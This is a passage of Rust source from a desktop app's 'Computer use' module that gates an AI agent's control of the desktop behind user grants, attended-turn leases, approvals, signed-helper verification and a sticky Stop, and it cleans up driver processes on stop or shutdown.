                stage = "computer_use_driver_prewarm",
                duration_ms = started_at.elapsed().as_millis() as u64,
                started,
                "Computer use startup stage completed"
            ),
            Err(error) => tracing::warn!(
                stage = "computer_use_driver_prewarm",
                duration_ms = started_at.elapsed().as_millis() as u64,
                error_code = error.code,
                "Computer use startup stage failed"
            ),
        }
    });
}

async fn prewarm_driver(app: &AppHandle, expected_epoch: u64) -> Result<bool, AppError> {
    let state = app.state::<ComputerUseState>();
    let mut driver = state.driver.lock().await;
    if driver.is_some() || !driver_prewarm_is_current(&state, expected_epoch) {
        return Ok(false);
    }

    let path = bundled_driver_executable(app)?;
    // Reuse JUN-411's fingerprint-cached verification before a prewarm can
    // create a persistent helper. This keeps prewarm behind the same signed
    // bundle gate as readiness probes and real actions.
    verify_packaged_driver_signatures(&state, &path, false).await?;
    driver_version(&path).await?;
    if !driver_prewarm_is_current(&state, expected_epoch) {
        return Ok(false);
    }

    let client = start_driver_for_epoch(&state, &path, expected_epoch).await?;
    if !driver_prewarm_is_current(&state, expected_epoch) {
        client.stop().await;
        return Ok(false);
    }
    state.driver_pid.store(client.pid(), Ordering::SeqCst);
    #[cfg(target_os = "macos")]
    if let Ok(mut run) = state.driver_run_directory.lock() {
        *run = Some(client.socket_dir.clone());
    }
    #[cfg(target_os = "macos")]
    if let Ok(mut socket) = state.driver_socket.lock() {
        *socket = Some(client.control_socket.clone());
    }
    state.driver_epoch.store(expected_epoch, Ordering::SeqCst);
    #[cfg(target_os = "windows")]
    if let Ok(mut cancel) = state.driver_cancel.lock() {
        *cancel = Some(client.cancel_handle());
    }
    *driver = Some(client);
    // Stop can race publication after the preceding check and exhaust its
    // bounded wait for this mutex. Once handles are visible, either Stop
    // cancels them or this publisher observes revocation and retires itself.
    if !driver_prewarm_is_current(&state, expected_epoch) {
        cancel_driver_processes(&state);
        if let Some(client) = driver.take() {
            client.stop().await;
        }
        return Ok(false);
    }
    Ok(true)
}

fn driver_prewarm_is_current(state: &ComputerUseState, expected_epoch: u64) -> bool {
    state.epoch.load(Ordering::SeqCst) == expected_epoch && runtime_ready_is_current(state, true)
}

#[tauri::command]
pub async fn computer_use_status(
    app: AppHandle,
    state: State<'_, ComputerUseState>,
) -> Result<ComputerUseStatus, AppError> {
    let (status, previous) = status_with_published_readiness(&app, &state).await?;
    let current = ready_state_value(status.ready);
    if previous != 0 && previous != current && !status.ready {
        stop_inner(&app, &state).await;
        replace_runtime_ready(&state, false);
    }
    if status.ready {
        schedule_driver_prewarm(&app);
    }
    Ok(status)
}

fn ready_state_value(ready: bool) -> u32 {
    if ready {
        2
    } else {
        1
    }
}

fn runtime_ready_is_current(state: &ComputerUseState, ready: bool) -> bool {
    state.runtime_ready_epoch.load(Ordering::SeqCst) == state.epoch.load(Ordering::SeqCst)
        && state.runtime_ready_state.load(Ordering::SeqCst) == ready_state_value(ready)
}

fn replace_runtime_ready(state: &ComputerUseState, ready: bool) -> u32 {
    let _publish = state
        .runtime_ready_publish
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let previous = state
        .runtime_ready_state
        .swap(ready_state_value(ready), Ordering::SeqCst);
    state
        .runtime_ready_epoch
        .store(state.epoch.load(Ordering::SeqCst), Ordering::SeqCst);
    previous
}

fn publish_runtime_ready_probe(
    state: &ComputerUseState,
    expected_epoch: u64,
    ready: bool,
) -> Option<u32> {
    let _publish = state
        .runtime_ready_publish
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    if state.epoch.load(Ordering::SeqCst) != expected_epoch {
        return None;
    }
    let previous = state
        .runtime_ready_state
        .swap(ready_state_value(ready), Ordering::SeqCst);
    state
        .runtime_ready_epoch
        .store(expected_epoch, Ordering::SeqCst);
    Some(previous)
}

async fn status_with_published_readiness(
    app: &AppHandle,
    state: &ComputerUseState,
) -> Result<(ComputerUseStatus, u32), AppError> {
    let expected_epoch = state.epoch.load(Ordering::SeqCst);
    let status = status_inner(app, state).await;
    let previous =
        publish_runtime_ready_probe(state, expected_epoch, status.ready).ok_or_else(|| {
            // Stop, revocation, or shutdown won while the helper/version/permission
            // probe was suspended. Reject the stale observation instead of
            // publishing, prewarming, or letting the UI render it.
            AppError::new(
                "computer_use_status_superseded",
                "Computer use changed while its status was loading. Try again.",
            )
        })?;
    Ok((status, previous))
}

#[tauri::command]
pub async fn set_computer_use_grant(
    app: AppHandle,
    state: State<'_, ComputerUseState>,
    request: SetComputerUseGrantRequest,
) -> Result<ComputerUseStatus, AppError> {
    store_grant(&app, request.enabled).await?;
    if !request.enabled {
        stop_inner(&app, &state).await;
        replace_runtime_ready(&state, false);
    }
    let (status, _) = status_with_published_readiness(&app, &state).await?;
    if status.ready {
        schedule_driver_prewarm(&app);
    }
    Ok(status)
}

#[tauri::command]
pub async fn computer_use_request_permissions(
    app: AppHandle,
    state: State<'_, ComputerUseState>,
) -> Result<ComputerUseStatus, AppError> {
    if !grant_enabled(&app).await {
        return Err(AppError::new(
            "computer_use_grant_required",
            "Enable Computer use before checking system access.",
        ));
    }
    stop_inner(&app, &state).await;
    replace_runtime_ready(&state, false);
    let path = bundled_driver_executable(&app)?;
    verify_packaged_driver_signatures(&state, &path, true).await?;
    driver_version(&path).await?;
    let _ = probe_permissions(&state, &path, true).await?;
    let (status, _) = status_with_published_readiness(&app, &state).await?;
    if status.ready {
        schedule_driver_prewarm(&app);
    }
    Ok(status)
}

pub(crate) async fn shutdown(app: &AppHandle) {
    let state = app.state::<ComputerUseState>();
    stop_for_shutdown(app, &state).await;
}

#[tauri::command]
pub async fn computer_use_stop(
    app: AppHandle,
    state: State<'_, ComputerUseState>,
) -> Result<ComputerUseStopResult, AppError> {
    stop_inner(&app, &state).await;
    Ok(ComputerUseStopResult { stopped: true })
}

/// Opens the Computer use broker only for a turn submitted from Clovy's visible
/// chat surface. The agent workspace receives the matching loopback
/// capability; the launchd routine gateway does not. This in-process lease is
/// a second gate, and makes Stop sticky until the user starts another turn.
#[tauri::command]
pub fn computer_use_begin_run(
    state: State<'_, ComputerUseState>,
    request: ComputerUseRunRequest,
) -> Result<(), AppError> {
    if state.cleanup_in_progress.load(Ordering::SeqCst) != 0 {
        return Err(AppError::new(
            "computer_use_stopping",
            "Computer use is still stopping. Start the task again in a moment.",
        ));
    }
    let session_id = validate_run_session_id(&request.session_id)?;
    begin_run_lease(&state, session_id)
}

fn begin_run_lease(state: &ComputerUseState, session_id: String) -> Result<(), AppError> {
    let mut runs = state
        .attended_runs
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Run lease lock failed."))?;
    // Cleanup increments its counter before taking the run lock. Recheck while
    // holding that lock so a lease cannot slip between the first check and a
    // terminal cleanup's idle decision.
    if state.cleanup_in_progress.load(Ordering::SeqCst) != 0 {
        return Err(AppError::new(
            "computer_use_stopping",
            "Computer use is still stopping. Start the task again in a moment.",
        ));
    }
    let starts_new_task = runs.is_empty();
    let inserted = runs.insert(session_id);
    drop(runs);
    if inserted {
        state.attended_generation.fetch_add(1, Ordering::SeqCst);
        if starts_new_task {
            clear_app_authorizations(state);
        }
    }
    Ok(())
}

fn end_run_lease(state: &ComputerUseState, session_id: &str) -> Result<Option<u64>, AppError> {
    let mut runs = state
        .attended_runs
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Run lease lock failed."))?;
    let removed = runs.remove(session_id);
    Ok((removed && runs.is_empty()).then(|| state.attended_generation.load(Ordering::SeqCst)))
}

#[tauri::command]
pub async fn computer_use_end_run(
    app: AppHandle,
    state: State<'_, ComputerUseState>,
    request: ComputerUseRunRequest,
) -> Result<(), AppError> {
    let session_id = validate_run_session_id(&request.session_id)?;
    let idle_generation = end_run_lease(&state, &session_id)?;
    if let Some(generation) = idle_generation {
        stop_if_idle(&app, &state, generation).await;
    }
    Ok(())
}

/// The lease of an attended CLI chat turn (`cli-substitui-agente-nativo`,
/// slice 2.6): the turn binding of the MCP connection grants it, in place of
/// the chat surface calling [`computer_use_begin_run`]. The first
/// `computer_use` call of the run opens it, later calls of the same run keep
/// it, and the run's terminal event (`run.completed`, `run.cancelled`,
/// `run.failed`) ends it like [`computer_use_end_run`]. The end listener is
/// registered before the lease is granted, and an ended run is remembered,
/// so a run that ends meanwhile can never leave a lease behind. Stop stays
/// sticky for the rest of the run: once Stop clears the lease, the same run
/// cannot open it again. Unattended turns never get one.
pub(crate) fn begin_turn_lease(
    app: &AppHandle,
    binding: &crate::mcp_server::turns::TurnBinding,
) -> Result<(), AppError> {
    let state = app.state::<ComputerUseState>();
    if watch_turn_in(&state, binding)? {
        end_turn_lease_with_run(app, binding.run_id.clone());
    }
    begin_turn_lease_in(&state, binding).map(|_| ())
}

/// Where a CLI turn's lease stands.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum TurnLease {
    /// The end listener is registered; no lease yet.
    Watched,
    /// The lease was granted (it may since have been stopped).
    Granted,
    /// The run published its terminal event.
    Ended,
}

fn turn_leases(
    state: &ComputerUseState,
) -> Result<std::sync::MutexGuard<'_, HashMap<String, TurnLease>>, AppError> {
    state
        .turn_leases
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Run lease lock failed."))
}

fn turn_ended_error() -> AppError {
    AppError::new(
        "computer_use_turn_ended",
        "This turn already ended. Send a new message to use Computer use.",
    )
}

/// First step of [`begin_turn_lease`]: `Ok(true)` when the caller must
/// register the run's end listener (before [`begin_turn_lease_in`]).
pub(crate) fn watch_turn_in(
    state: &ComputerUseState,
    binding: &crate::mcp_server::turns::TurnBinding,
) -> Result<bool, AppError> {
    if !binding.attended {
        return Err(attended_run_required());
    }
    let mut leases = turn_leases(state)?;
    match leases.get(&binding.run_id) {
        Some(TurnLease::Ended) => Err(turn_ended_error()),
        Some(_) => Ok(false),
        None => {
            leases.insert(binding.run_id.clone(), TurnLease::Watched);
            Ok(true)
        }
    }
}

/// Grants the run's lease: `Ok(true)` when this call opened it.
pub(crate) fn begin_turn_lease_in(
    state: &ComputerUseState,
    binding: &crate::mcp_server::turns::TurnBinding,
) -> Result<bool, AppError> {
    if !binding.attended {
        return Err(attended_run_required());
    }
    if state.cleanup_in_progress.load(Ordering::SeqCst) != 0 {
        return Err(AppError::new(
            "computer_use_stopping",
            "Computer use is still stopping. Start the task again in a moment.",
        ));
    }
    let key = turn_lease_key(&binding.run_id);
    let mut leases = turn_leases(state)?;
    match leases.get(&binding.run_id) {
        Some(TurnLease::Ended) => return Err(turn_ended_error()),
        Some(TurnLease::Granted) => {
            let live = state
                .attended_runs
                .lock()
                .map_err(|_| AppError::new("computer_use_unavailable", "Run lease lock failed."))?
                .contains(&key);
            return if live {
                Ok(false)
            } else {
                Err(AppError::new(
                    "computer_use_stopped",
                    "Computer use was stopped for this turn. Send a new message to use it again.",
                ))
            };
        }
        Some(TurnLease::Watched) | None => {}
    }
    begin_run_lease(state, key)?;
    leases.insert(binding.run_id.clone(), TurnLease::Granted);
    Ok(true)
}

fn attended_run_required() -> AppError {
    AppError::new(
        "computer_use_attended_run_required",
        "Computer use is available only during a turn started from Clovy chat.",
    )
}

/// The run ended: forgets its lease and refuses any later one. `Some(generation)`
/// when no attended run is left (the caller may stop the idle driver, as
/// `computer_use_end_run`).
pub(crate) fn end_turn_lease_in(
    state: &ComputerUseState,
    run_id: &str,
) -> Result<Option<u64>, AppError> {
    let mut leases = turn_leases(state)?;
    leases.insert(run_id.to_string(), TurnLease::Ended);
    let mut owner = state
        .active_turn
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Turn owner lock failed."))?;
    let ended = end_run_lease(state, &turn_lease_key(run_id));
    if owner.as_deref() == Some(run_id) {
        // Termination must not wait behind a driver call holding its mutex.
        // Invalidate its epoch and kill the owned process before allowing a
        // different turn to select its own target.
        invalidate_epoch(state);
        cancel_driver_processes(state);
        *owner = None;
    }
    drop(owner);
    drop(leases);
    ended
}

fn turn_lease_key(run_id: &str) -> String {
    format!("cli-turn:{run_id}")
}

/// Ends the run's lease when the run publishes its terminal event.
fn end_turn_lease_with_run(app: &AppHandle, run_id: String) {
    use tauri::Listener;
    // (listener id once known, whether the event already fired)
    let slot: Arc<Mutex<(Option<tauri::EventId>, bool)>> = Arc::default();
    let own = Arc::clone(&slot);
    let handle = app.clone();
    let id = app.listen_any(
        crate::agent_sessions::events::AGENT_RUNTIME_EVENT,
        move |event| {
            if !is_terminal_event_of(event.payload(), &run_id) {
                return;
            }
            let state = handle.state::<ComputerUseState>();
            let idle = end_turn_lease_in(&state, &run_id).ok().flatten();
            if let Ok(mut slot) = own.lock() {
                slot.1 = true;
                if let Some(id) = slot.0.take() {
                    handle.unlisten(id);
                }
            }
            if let Some(generation) = idle {
                let app = handle.clone();
                tauri::async_runtime::spawn(async move {
                    let state = app.state::<ComputerUseState>();
                    stop_if_idle(&app, &state, generation).await;
                });
            }
        },
    );
    if let Ok(mut slot) = slot.lock() {
        if slot.1 {
            app.unlisten(id);
        } else {
            slot.0 = Some(id);
        }
    };
}

fn is_terminal_event_of(payload: &str, run_id: &str) -> bool {
    // Every streamed delta passes here; skip the parse for other runs.
    if !payload.contains(run_id) {
        return false;
    }
    let Ok(event) = serde_json::from_str::<Value>(payload) else {
        return false;
    };
    event.get("runId").and_then(Value::as_str) == Some(run_id)
        && matches!(
            event.get("method").and_then(Value::as_str),
            Some("run.completed" | "run.cancelled" | "run.failed")
        )
}

#[cfg(test)]
pub(crate) fn has_attended_run(state: &ComputerUseState) -> bool {
    state
        .attended_runs
        .lock()
        .is_ok_and(|runs| !runs.is_empty())
}

/// Stop for tests without an app: clears every lease, as [`stop_inner`].
#[cfg(test)]
pub(crate) fn clear_leases_for_test(state: &ComputerUseState) {
    state.attended_runs.lock().unwrap().clear();
}

fn validate_run_session_id(session_id: &str) -> Result<String, AppError> {
    let session_id = session_id.trim();
    if session_id.is_empty() || session_id.len() > 512 || session_id.chars().any(char::is_control) {
        return Err(AppError::new(
            "computer_use_run_invalid",
            "Computer use requires a valid active session.",
        ));
    }
    Ok(session_id.to_string())
}

#[tauri::command]
pub fn computer_use_approvals_pending(
    state: State<'_, ComputerUseState>,
) -> Result<Vec<PendingComputerUseApproval>, AppError> {
    let approvals = state
        .approvals
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Approval lock failed."))?;
    let mut pending: Vec<_> = approvals
        .values()
        .map(|entry| entry.approval.clone())
        .collect();
    pending.sort_by_key(|approval| approval.requested_at_ms);
    Ok(pending)
}

#[tauri::command]
pub fn computer_use_approval_respond(
    app: AppHandle,
    state: State<'_, ComputerUseState>,
    request: RespondComputerUseApprovalRequest,
) -> Result<(), AppError> {
    let entry = state
        .approvals
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Approval lock failed."))?
        .remove(&request.approval_id)
        .ok_or_else(|| {
            AppError::new(
                "computer_use_approval_not_found",
                "That Computer use approval is no longer pending.",
            )
        })?;
    let _ = entry.responder.send(request.approve);
    emit_approvals_changed(&app, &state);
    Ok(())
}

async fn stop_inner(app: &AppHandle, state: &ComputerUseState) {
    let _cleanup = CleanupInProgress::begin(&state.cleanup_in_progress);
    if let Ok(mut runs) = state.attended_runs.lock() {
        runs.clear();
    }
    invalidate_epoch(state);
    crate::computer_use_cursor::hide(app);
    cancel_pending(app, state);
    cancel_driver_processes(state);
    if let Some(mut slot) =
        crate::shutdown::lock_async_for(&state.driver, SHUTDOWN_MUTEX_TIMEOUT).await
    {
        if let Some(driver) = slot.take() {
            driver.stop().await;
        }
    }
    if let Ok(mut target) = state.target.lock() {
        *target = None;
    }
    clear_app_authorizations(state);
    clear_capture_dir(app);
    let _ = set_clovy_stage_companion(app, false).await;
}

async fn stop_for_shutdown(app: &AppHandle, state: &ComputerUseState) {
    let _cleanup = CleanupInProgress::begin(&state.cleanup_in_progress);
    if let Some(mut runs) =
        crate::shutdown::try_lock_for(&state.attended_runs, SHUTDOWN_MUTEX_TIMEOUT)
    {
        runs.clear();
    } else {
        tracing::warn!("computer use shutdown timed out acquiring the run lock");
    }
    invalidate_epoch(state);
    crate::computer_use_cursor::hide(app);

    let entries = crate::shutdown::try_lock_for(&state.approvals, SHUTDOWN_MUTEX_TIMEOUT)
        .map(|mut approvals| {
            approvals
                .drain()
                .map(|(_, entry)| entry)
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    for entry in entries {
        let _ = entry.responder.send(false);
    }

    cancel_driver_processes(state);
    if let Some(mut driver) =
        crate::shutdown::lock_async_for(&state.driver, SHUTDOWN_MUTEX_TIMEOUT).await
    {
        if let Some(driver) = driver.take() {
            let _ = tokio::time::timeout(DRIVER_SHUTDOWN_TIMEOUT, driver.stop()).await;
        }
    } else {
        tracing::warn!("computer use shutdown timed out acquiring the driver lock");
    }
    if let Some(mut target) = crate::shutdown::try_lock_for(&state.target, SHUTDOWN_MUTEX_TIMEOUT) {
        *target = None;
    }
    if let Some(mut authorized_apps) =
        crate::shutdown::try_lock_for(&state.authorized_apps, SHUTDOWN_MUTEX_TIMEOUT)
    {
        authorized_apps.clear();
    }
    clear_capture_dir(app);
    let _ = set_clovy_stage_companion(app, false).await;
}

/// Retires a completed attended run without erasing a newer run that began
/// while the terminal event was crossing the webview boundary.
///
/// Retire the controller namespace too: engine refs cannot outlive their run.
async fn stop_if_idle(app: &AppHandle, state: &ComputerUseState, generation: u64) {
    let _operation = state.operation.lock().await;
    let _cleanup = CleanupInProgress::begin(&state.cleanup_in_progress);
    if !idle_generation_is_current(state, generation) {
        return;
    }
    invalidate_epoch(state);
    cancel_driver_processes(state);
    if let Some(client) = state.driver.lock().await.take() {
        client.stop().await;
    }
    crate::computer_use_cursor::hide(app);
    cancel_pending(app, state);
    if let Ok(mut target) = state.target.lock() {
        *target = None;
    }
    clear_app_authorizations(state);
    clear_capture_dir(app);
    let _ = set_clovy_stage_companion(app, false).await;
    schedule_driver_prewarm(app);
}

fn idle_generation_is_current(state: &ComputerUseState, generation: u64) -> bool {
    state.attended_runs.lock().is_ok_and(|runs| {
        runs.is_empty() && state.attended_generation.load(Ordering::SeqCst) == generation
    })
}

fn clear_app_authorizations(state: &ComputerUseState) {
    if let Ok(mut authorized_apps) = state.authorized_apps.lock() {
        authorized_apps.clear();
    }
}

fn cancel_driver_processes(state: &ComputerUseState) {
    let pid = state.driver_pid.swap(0, Ordering::SeqCst);
    #[cfg(target_os = "macos")]
    if let Ok(mut socket) = state.driver_socket.lock() {
        if let Some(socket) = socket.take() {
            // The authenticated helper watches EOF on a separate task and
            // kills its own controller group. This also works when macOS
            // refuses external process-environment inspection.
            let _ = socket.shutdown(std::net::Shutdown::Both);
        }
    }
    #[cfg(target_os = "macos")]
    if let Ok(mut root) = state.driver_run_directory.lock() {
        if let Some(root) = root.take() {
            crate::computer_use_macos::terminate_owned_group(pid, &root);
        }
    }
    #[cfg(target_os = "windows")]
    if let Ok(mut cancel) = state.driver_cancel.lock() {
        if let Some(cancel) = cancel.take() {
            cancel.cancel();
        }
    }
    #[cfg(not(target_os = "macos"))]
    let _ = pid;
}

fn invalidate_epoch(state: &ComputerUseState) {
    state.epoch.fetch_add(1, Ordering::SeqCst);
    state.epoch_changed.notify_waiters();
}

async fn start_driver_for_epoch(
    state: &ComputerUseState,
    path: &Path,
    epoch: u64,
) -> Result<DriverClient, AppError> {
    let browser_runtime = state.browser_runtime()?;
    with_epoch_guard(
        state,
        epoch,
        DriverClient::start(path, None, browser_runtime),
    )
    .await
}

async fn with_epoch_guard<T>(
    state: &ComputerUseState,
    epoch: u64,
    operation: impl Future<Output = Result<T, AppError>>,
) -> Result<T, AppError> {
    let cancelled = state.epoch_changed.notified();
    tokio::pin!(cancelled);
    cancelled.as_mut().enable();
    ensure_epoch_current(state, Some(epoch))?;
    tokio::select! {
        biased;
        _ = &mut cancelled => Err(AppError::new("computer_use_stopped", "Computer use stopped during helper startup.")),
        result = operation => result,
    }
}

fn cancel_pending(app: &AppHandle, state: &ComputerUseState) {
    let entries = state
        .approvals
        .lock()
        .map(|mut approvals| {
            approvals
                .drain()
                .map(|(_, entry)| entry)
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    for entry in entries {
        let _ = entry.responder.send(false);
    }
    emit_approvals_changed(app, state);
}

fn emit_approvals_changed(app: &AppHandle, state: &ComputerUseState) {
    let pending_count = state
        .approvals
        .lock()
        .map(|approvals| approvals.len())
        .unwrap_or(0);
    let _ = app.emit(
        APPROVALS_CHANGED_EVENT,
        json!({ "pendingCount": pending_count }),
    );
}

/// Runs a CLI turn's Computer use action through the broker and the per-app
/// authorization. CLI turns are the only callers (ADR-0067).
pub(crate) async fn handle_cli_action_for_call(
    app: &AppHandle,
    run_id: String,
    arguments: Value,
) -> Value {
    let state = app.state::<ComputerUseState>();
    match handle_action(app, &state, &run_id, arguments).await {
        Ok(result) => result,
        Err(error) => mcp_error(&error),
    }
}

pub(crate) fn normalized_action(arguments: &Value) -> Result<String, AppError> {
    let action = arguments
        .get("action")
        .and_then(Value::as_str)
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    if matches!(
        action.as_str(),
        "capture"
            | "list_apps"
            | "wait"
            | "open_app"
            | "focus_app"
            | "click"
            | "double_click"
            | "right_click"
            | "drag"
            | "scroll"
            | "type"
            | "key"
            | "set_value"
    ) {
        Ok(action)
    } else {
        Err(AppError::new(
            "computer_use_action_invalid",
            "Computer use received an unknown action.",
        ))
    }
}

async fn handle_action(
    app: &AppHandle,
    state: &ComputerUseState,
    run_id: &str,
    arguments: Value,
) -> Result<Value, AppError> {
    let _operation = state.operation.lock().await;
    select_turn_owner(state, run_id)?;
    let epoch = state.epoch.load(Ordering::SeqCst);
    ensure_epoch_current(state, Some(epoch))?;
    ensure_attended_run(state)?;
    let task_generation = state.attended_generation.load(Ordering::SeqCst);
    ensure_action_eligible(app).await?;
    let action = normalized_action(&arguments)?;
    crate::computer_use_cursor::show(app, epoch);
    match action.as_str() {
        "capture" => capture(app, state, &arguments, Some(epoch), task_generation).await,
        "list_apps" => list_apps(app, state, Some(epoch)).await,
        "wait" => {
            let seconds = arguments
                .get("seconds")
                .and_then(Value::as_f64)
                .unwrap_or(1.0)
                .clamp(0.0, 30.0);
            tokio::time::sleep(Duration::from_secs_f64(seconds)).await;
            ensure_epoch_current(state, Some(epoch))?;
            ensure_attended_run(state)?;
            ensure_task_generation_current(state, task_generation)?;
            Ok(mcp_text(
                json!({ "ok": true, "action": "wait", "seconds": seconds }),
            ))
        }
        "open_app" => open_app(app, state, &arguments, epoch, task_generation).await,
        "focus_app" => focus_app(app, state, &arguments, epoch, task_generation).await,
        "click" | "double_click" | "right_click" | "drag" | "scroll" | "type" | "key"
        | "set_value" => mutate(app, state, &action, &arguments, epoch, task_generation).await,
        // The allowlist above should make this unreachable; if the two ever
        // drift, fail the action instead of panicking an attended task.
        _ => Err(AppError::new(
            "computer_use_action_invalid",
            "Computer use received an unknown action.",
        )),
    }
}

fn ensure_attended_run(state: &ComputerUseState) -> Result<(), AppError> {
    let owner = state
        .active_turn
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Turn owner lock failed."))?
        .clone();
    let runs = state
        .attended_runs
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Run lease lock failed."))?;
    let attended = owner
        .as_ref()
        .is_some_and(|owner| runs.contains(&turn_lease_key(owner)));
    if attended {
        Ok(())
    } else {
        Err(AppError::new(
            "computer_use_attended_run_required",
            "Computer use is available only during a turn started from Clovy chat.",
        ))
    }
}

// One attended run owns the serialized controller. Switching owners retires
// its entire engine namespace as well as the target and app grants.
fn select_turn_owner(state: &ComputerUseState, run_id: &str) -> Result<(), AppError> {
    let mut owner = state
        .active_turn
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Turn owner lock failed."))?;
    let runs = state
        .attended_runs
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Run lease lock failed."))?;
    if !runs.contains(&turn_lease_key(run_id)) {
        return Err(attended_run_required());
    }
    if owner.as_deref() != Some(run_id) {
        invalidate_epoch(state);
        cancel_driver_processes(state);
        let mut target = state
            .target
            .lock()
            .map_err(|_| AppError::new("computer_use_unavailable", "Target lock failed."))?;
        let mut apps = state.authorized_apps.lock().map_err(|_| {
            AppError::new("computer_use_unavailable", "App authorization lock failed.")
        })?;
        if let Some(path) = target.take().and_then(|target| target.capture_path) {
            remove_capture(Some(&path));
        }
        apps.clear();
        *owner = Some(run_id.to_owned());
    }
    Ok(())
}

fn ensure_task_generation_current(
    state: &ComputerUseState,
    expected_generation: u64,
) -> Result<(), AppError> {
    if state.attended_generation.load(Ordering::SeqCst) == expected_generation {
        Ok(())
    } else {
        Err(AppError::new(
            "computer_use_task_changed",
            "The Computer use task changed before app access was authorized.",
        ))
    }
}

/// The facts eligibility depends on: the platform, the user's Computer use
/// grant and the bundled driver (macOS permissions are the driver's to
/// check). Nothing remote and nothing about Clovy's plan or models
/// (ADR-0067); the action only reaches here from a CLI turn's `clovy-mcp`.
pub(crate) trait EligibilityProbe: Sync {
    fn platform_supported(&self) -> bool {
        cfg!(any(target_os = "macos", target_os = "windows"))
    }
    fn grant_enabled(&self) -> BoxedBool<'_>;
    fn driver(&self) -> Result<(), AppError>;
}

pub(crate) type BoxedBool<'a> = std::pin::Pin<Box<dyn Future<Output = bool> + Send + 'a>>;

struct AppEligibility<'a>(&'a AppHandle);

impl EligibilityProbe for AppEligibility<'_> {
    fn grant_enabled(&self) -> BoxedBool<'_> {
        Box::pin(grant_enabled(self.0))
    }
    fn driver(&self) -> Result<(), AppError> {
        bundled_driver_executable(self.0).map(|_| ())
    }
}

async fn ensure_action_eligible(app: &AppHandle) -> Result<(), AppError> {
    check_eligibility(&AppEligibility(app)).await
}

pub(crate) async fn check_eligibility(probe: &dyn EligibilityProbe) -> Result<(), AppError> {
    if !probe.platform_supported() {
        return Err(AppError::new(
            "computer_use_unsupported",
            "Computer use requires macOS or Windows.",
        ));
    }
    if !probe.grant_enabled().await {
        return Err(AppError::new(
            "computer_use_grant_required",
            "Computer use is off. Enable it in Plugins and finish setup.",
        ));
    }
    probe.driver()
}

async fn driver_call(
    app: &AppHandle,
    state: &ComputerUseState,
    tool: &str,
    arguments: Value,
    expected_epoch: Option<u64>,
) -> Result<Value, AppError> {
    let startup_epoch = expected_epoch.unwrap_or_else(|| state.current_epoch());
    let expected_epoch = Some(startup_epoch);
    ensure_epoch_current(state, expected_epoch)?;
    ensure_attended_run(state)?;
    let mut driver = state.driver.lock().await;
    ensure_epoch_current(state, expected_epoch)?;
    ensure_attended_run(state)?;
    if state.driver_epoch.load(Ordering::SeqCst) != state.current_epoch() {
        if let Some(client) = driver.take() {
            client.stop().await;
        }
    }
    if driver.is_none() {
        let path = bundled_driver_executable(app)?;
        verify_packaged_driver_signatures(state, &path, false).await?;
        driver_version(&path).await?;
        // Verification can yield while Stop retires this request's epoch.
        // Never bind stale work to whichever epoch happens to be current.
        ensure_epoch_current(state, expected_epoch)?;
        ensure_attended_run(state)?;
        let client = start_driver_for_epoch(state, &path, startup_epoch).await?;
        #[cfg(target_os = "windows")]
        if let Ok(mut cancel) = state.driver_cancel.lock() {
            *cancel = Some(client.cancel_handle());
        }
        state.driver_pid.store(client.pid(), Ordering::SeqCst);
        #[cfg(target_os = "macos")]
        if let Ok(mut run) = state.driver_run_directory.lock() {
            *run = Some(client.socket_dir.clone());
        }
        #[cfg(target_os = "macos")]
        if let Ok(mut socket) = state.driver_socket.lock() {
            *socket = Some(client.control_socket.clone());
        }
        state.driver_epoch.store(startup_epoch, Ordering::SeqCst);
        if let Err(error) =
            ensure_epoch_current(state, expected_epoch).and_then(|()| ensure_attended_run(state))
        {
            cancel_driver_processes(state);
            client.stop().await;
            return Err(error);
        }
        *driver = Some(client);
    }
    ensure_epoch_current(state, expected_epoch)?;
    ensure_attended_run(state)?;
    let notification_app = app.clone();
    let mut handle_notification = move |notification: &Value| {
        let Some(expected_epoch) = expected_epoch else {
            return;
        };
        let state = notification_app.state::<ComputerUseState>();
        let Some(target) = state.target.lock().ok().and_then(|target| target.clone()) else {
            return;
        };
        crate::computer_use_cursor::apply_driver_notification(
            &notification_app,
            expected_epoch,
            notification,
            target.pid,
            target.window_id,
            target.bounds,
        );
    };
    let result = driver
        .as_mut()
        .expect("driver inserted above")
        .call_tool(tool, arguments, &mut handle_notification)
        .await;
    if result
        .as_ref()
        .err()
        .is_some_and(driver_failure_retires_run)
    {
        invalidate_epoch(state);
        if result.as_ref().err().is_some_and(desktop_access_was_lost) {
            replace_runtime_ready(state, false);
        }
        // Broken transport or lost desktop access retires this run's authority.
        // The same turn cannot restart a helper and reuse its public numbers.
        if let Ok(mut runs) = state.attended_runs.lock() {
            runs.clear();
        }
        cancel_driver_processes(state);
        crate::computer_use_cursor::hide(app);
        if let Ok(mut target) = state.target.lock() {
            if let Some(path) = target.take().and_then(|target| target.capture_path) {
                remove_capture(Some(&path));
            }
        }
        clear_app_authorizations(state);
        if let Some(client) = driver.take() {
            client.stop().await;
        }
    }
    result
}

fn desktop_access_was_lost(error: &AppError) -> bool {
    error.code == "computer_use_desktop_unavailable"
        || error.details.as_ref().is_some_and(|details| {
            details
                .pointer("/engineReceipt/error/details/clovy_code")
                .and_then(Value::as_str)
                == Some("computer_use_desktop_unavailable")
        })
}

fn driver_failure_retires_run(error: &AppError) -> bool {
    desktop_access_was_lost(error)
        || error.code.starts_with("computer_use_driver_")
        || matches!(
            error.code.as_str(),
            "computer_use_engine_transport" | "computer_use_engine_protocol"
        )
}

fn ensure_epoch_current(
    state: &ComputerUseState,
    expected_epoch: Option<u64>,
) -> Result<(), AppError> {
    if expected_epoch.is_some_and(|expected| state.epoch.load(Ordering::SeqCst) != expected) {
        return Err(AppError::new(
            "computer_use_stopped",
